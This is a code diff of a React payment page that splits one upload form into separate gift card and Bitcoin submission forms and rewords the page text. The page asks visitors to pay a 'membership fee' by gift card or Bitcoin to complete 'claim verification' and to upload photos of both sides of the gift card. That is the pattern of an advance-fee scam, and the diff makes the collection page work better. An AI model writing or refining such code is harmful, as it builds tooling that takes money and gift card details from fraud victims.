@@ -2,7 +2,8 @@ import React, { useState } from "react";
 import HeroHeader from "../components/HeroHeader";
 
 export default function Payment() {
-  const [status, setStatus] = useState(null);
+  const [giftcardStatus, setGiftcardStatus] = useState(null);
+  const [bitcoinStatus, setBitcoinStatus] = useState(null);
 
   const bitcoinAddress = "bc1xxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
 
@@ -11,11 +12,13 @@ export default function Payment() {
     alert("Bitcoin address copied.");
   };
 
-  const handleUploadSubmit = async (e) => {
+  const handleGiftcardSubmit = async (e) => {
     e.preventDefault();
 
+    setGiftcardStatus(null);
+
     const formData = new FormData();
-    formData.append("type", "verification");
+    formData.append("type", "giftcard");
     formData.append("name", e.target.name.value);
     formData.append("email", e.target.email.value);
     formData.append("frontImage", e.target.frontImage.files[0]);
@@ -30,18 +33,21 @@ export default function Payment() {
       const data = await res.json();
 
       if (data.success) {
-        setStatus("success");
+        setGiftcardStatus("success");
         e.target.reset();
       } else {
-        setStatus("error");
+        setGiftcardStatus("error");
       }
-    } catch {
-      setStatus("error");
+    } catch (err) {
+      console.error(err);
+      setGiftcardStatus("error");
     }
   };
 
   const handleBitcoinSubmit = async (e) => {
     e.preventDefault();
+
+    setBitcoinStatus(null);
 
     const formData = new FormData();
     formData.append("type", "bitcoin");
@@ -58,13 +64,14 @@ export default function Payment() {
       const data = await res.json();
 
       if (data.success) {
-        setStatus("success");
+        setBitcoinStatus("success");
         e.target.reset();
       } else {
-        setStatus("error");
+        setBitcoinStatus("error");
       }
-    } catch {
-      setStatus("error");
+    } catch (err) {
+      console.error(err);
+      setBitcoinStatus("error");
     }
   };
 
@@ -73,24 +80,26 @@ export default function Payment() {
       <HeroHeader />
 
       <div className="payment-page">
-        <h1 className="payment-title">
-          Payment & Membership Payment Submission
-        </h1>
+        <h1 className="payment-title">Payment & Membership Fee Submission</h1>
 
         <p className="payment-text">
           Complete your claim verification by paying the required membership fee
-          via Gift Card or Bitcoin. After payment, please upload your Gift Card
-          information or Bitcoin transaction receipt as proof of payment. Our
-          verification team will review your submission and process your claim
-          accordingly.
+          using either a Gift Card or Bitcoin. After payment, submit proof of
+          payment by uploading your Gift Card images or Bitcoin transaction
+          receipt. Our verification team will review your submission and process
+          your claim accordingly.
         </p>
 
-        {/* CARD 1 */}
+        {/* GIFT CARD CARD */}
 
         <div className="payment-card">
-          <h2>Upload Front & Back Giftcard</h2>
+          <h2>Gift Card Payment</h2>
 
-          <form onSubmit={handleUploadSubmit}>
+          <p className="card-text">
+            Upload clear images of the front and back of your gift card.
+          </p>
+
+          <form onSubmit={handleGiftcardSubmit} encType="multipart/form-data">
             <input type="text" name="name" placeholder="Full Name" required />
 
             <input
@@ -100,28 +109,45 @@ export default function Payment() {
               required
             />
 
-            <label>Front Image</label>
+            <label>Front of Gift Card</label>
             <input type="file" name="frontImage" accept="image/*" required />
 
-            <label>Back Image</label>
+            <label>Back of Gift Card</label>
             <input type="file" name="backImage" accept="image/*" required />
 
-            <button type="submit">Submit Verification</button>
+            <button type="submit">Submit Gift Card</button>
           </form>
+
+          {giftcardStatus === "success" && (
+            <div className="success-box">
+              Gift card submission received successfully.
+            </div>
+          )}
+
+          {giftcardStatus === "error" && (
+            <div className="error-box">
+              Unable to submit gift card information. Please try again.
+            </div>
+          )}
         </div>
 
-        {/* CARD 2 */}
+        {/* BITCOIN CARD */}
 
         <div className="payment-card">
           <h2>Bitcoin Payment</h2>
 
-          <p className="btc-address">{bitcoinAddress}</p>
+          <p className="card-text">
+            Send your payment to the Bitcoin wallet address below, then upload
+            your transaction receipt.
+          </p>
+
+          <div className="btc-address">{bitcoinAddress}</div>
 
           <button type="button" className="copy-btn" onClick={copyBitcoin}>
             Copy Bitcoin Address
           </button>
 
-          <form onSubmit={handleBitcoinSubmit}>
+          <form onSubmit={handleBitcoinSubmit} encType="multipart/form-data">
             <input type="text" name="name" placeholder="Full Name" required />
 
             <input
@@ -131,22 +157,25 @@ export default function Payment() {
               required
             />
 
-            <label>Upload Payment Receipt</label>
+            <label>Upload Bitcoin Receipt</label>
+
             <input type="file" name="receipt" accept="image/*,.pdf" required />
 
             <button type="submit">Submit Receipt</button>
           </form>
+
+          {bitcoinStatus === "success" && (
+            <div className="success-box">
+              Bitcoin receipt submitted successfully.
+            </div>
+          )}
+
+          {bitcoinStatus === "error" && (
+            <div className="error-box">
+              Unable to submit your Bitcoin receipt. Please try again.
+            </div>
+          )}
         </div>
-
-        {status === "success" && (
-          <div className="success-box">Submission received successfully.</div>
-        )}
-
-        {status === "error" && (
-          <div className="error-box">
-            Something went wrong. Please try again.
-          </div>
-        )}
       </div>
     </div>
   );
